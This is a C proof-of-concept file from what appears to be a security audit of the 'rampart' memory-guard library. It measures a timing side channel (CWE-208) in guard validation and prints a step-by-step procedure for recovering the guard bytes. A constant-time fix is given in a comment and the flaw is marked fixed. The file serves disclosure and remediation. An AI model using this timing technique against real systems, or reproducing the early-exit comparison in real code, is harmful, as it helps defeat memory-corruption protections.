/**
 * @file poc_08_timing_guards.c
 * @brief PoC for VULN-008: Timing Side-Channel in Guard Validation
 *
 * VULNERABILITY: Guard validation uses byte-by-byte comparison with
 *                early exit, leaking timing information.
 *
 * CVSS 3.1: 7.1 (High)
 * CWE-208: Observable Timing Discrepancy
 *
 * IMPACT: Attacker can determine guard pattern bytes one at a time
 *         via timing analysis.
 *
 * LOCATION: src/rp_block.c:56-76
 *
 * STATUS: FIXED - Constant-time comparison implemented using XOR accumulation.
 *         The verify_guard_pattern function now always processes all bytes
 *         regardless of mismatches, eliminating timing variation.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "rampart.h"

/*
 * The vulnerable code (verify_guard_pattern):
 *
 * for (i = 0; i < size; i++) {
 *     if (ptr[i] != bytes[i % 4]) {
 *         return 0;  // Early exit on mismatch!
 *     }
 * }
 * return 1;
 *
 * Timing varies based on where the first mismatch occurs.
 * More matching bytes = longer execution time.
 */

#define ITERATIONS 10000
#define GUARD_SIZE 16

/* Measure time for validation with different corruption patterns */
static long measure_validation_time(rampart_pool_t *pool, char *block,
                                     size_t alloc_size, int corrupt_byte) {
    struct timespec start, end;
    long total_ns = 0;
    int i;
    rampart_error_t err;

    for (i = 0; i < ITERATIONS; i++) {
        /* Reset to valid data */
        memset(block, 'A', alloc_size);

        /* Corrupt specific byte after the allocation */
        if (corrupt_byte >= 0) {
            block[alloc_size + corrupt_byte] = 0x00;
        }

        clock_gettime(CLOCK_MONOTONIC, &start);
        err = rampart_validate(pool, block);
        clock_gettime(CLOCK_MONOTONIC, &end);

        (void)err;  /* We expect failure for corrupted guards */

        total_ns += (end.tv_sec - start.tv_sec) * 1000000000L +
                    (end.tv_nsec - start.tv_nsec);
    }

    return total_ns / ITERATIONS;
}

int main(void) {
    rampart_config_t config;
    rampart_pool_t *pool;
    char *block;
    const size_t alloc_size = 64;
    long times[GUARD_SIZE + 1];
    int i;

    printf("=== VULN-008: Timing Side-Channel in Guards ===\n\n");

    /* Initialize pool */
    rampart_config_default(&config);
    config.pool_size = 64 * 1024;

    pool = rampart_init(&config);
    if (pool == NULL) {
        printf("[!] Pool creation failed\n");
        return 1;
    }

    block = (char *)rampart_alloc(pool, alloc_size);
    if (block == NULL) {
        printf("[!] Allocation failed\n");
        rampart_shutdown(pool);
        return 1;
    }

    printf("[*] Allocated %zu bytes at: %p\n", alloc_size, (void *)block);
    printf("[*] Measuring validation timing (%d iterations each)...\n\n",
           ITERATIONS);

    /*
     * Measure timing for corruption at different positions.
     *
     * The rear guard starts at block + alloc_size.
     * If we corrupt byte N, the validation loop runs until byte N.
     *
     * Timing pattern:
     * - Corrupt byte 0: Very fast (fails immediately)
     * - Corrupt byte 1: Slightly slower (1 byte matches)
     * - Corrupt byte 2: Even slower (2 bytes match)
     * - etc.
     *
     * This reveals the guard pattern byte by byte.
     */

    printf("[*] Rear guard validation timing:\n");
    printf("    (corrupting rear guard at different offsets)\n\n");

    /* Measure with no corruption (all bytes match) */
    times[GUARD_SIZE] = measure_validation_time(pool, block, alloc_size, -1);

    /* Measure with corruption at each position */
    for (i = 0; i < GUARD_SIZE; i++) {
        times[i] = measure_validation_time(pool, block, alloc_size, i);
    }

    /* Display results */
    printf("    Position  |  Avg Time (ns)  |  Matching Bytes\n");
    printf("    ----------+-----------------+----------------\n");

    for (i = 0; i < GUARD_SIZE; i++) {
        printf("    Byte %2d   |  %8ld ns    |  %d bytes match\n",
               i, times[i], i);
    }

    printf("    No corrupt|  %8ld ns    |  All 16 match\n", times[GUARD_SIZE]);

    printf("\n=== Analysis ===\n");

    /* Check if timing varies with position */
    if (times[0] < times[GUARD_SIZE] / 2) {
        printf("[VULNERABLE] Timing varies with corruption position!\n");
        printf("[*] Early corruption = faster failure\n");
        printf("[*] Later corruption = slower failure\n");
        printf("\n[*] Attack procedure:\n");
        printf("    1. Corrupt byte 0 with value X\n");
        printf("    2. Measure validation time\n");
        printf("    3. If time matches 'corrupt at 0' baseline:\n");
        printf("       X is NOT the correct byte value\n");
        printf("    4. If time matches 'corrupt at 1' baseline:\n");
        printf("       X IS the correct byte 0 value\n");
        printf("    5. Repeat for all 16 bytes\n");
        printf("    6. Full guard pattern recovered!\n");
    } else {
        printf("[*] Timing difference not significant in this run.\n");
        printf("    (May need more iterations or statistical analysis)\n");
    }

    printf("\n[*] Note: Timing attacks are noisy. In practice:\n");
    printf("    - Use statistical analysis\n");
    printf("    - Repeat many times\n");
    printf("    - Account for system noise\n");

    rampart_free(pool, block);
    rampart_shutdown(pool);

    printf("\n=== PoC Complete ===\n");

    /*
     * REMEDIATION:
     * Use constant-time comparison:
     *
     * int verify_guard_pattern_safe(const unsigned char *ptr,
     *                                size_t size,
     *                                unsigned long pattern) {
     *     unsigned char diff = 0;
     *     for (i = 0; i < size; i++) {
     *         diff |= ptr[i] ^ bytes[i % 4];
     *     }
     *     return (diff == 0);
     * }
     *
     * This always processes all bytes regardless of mismatches.
     */

    return 0;
}
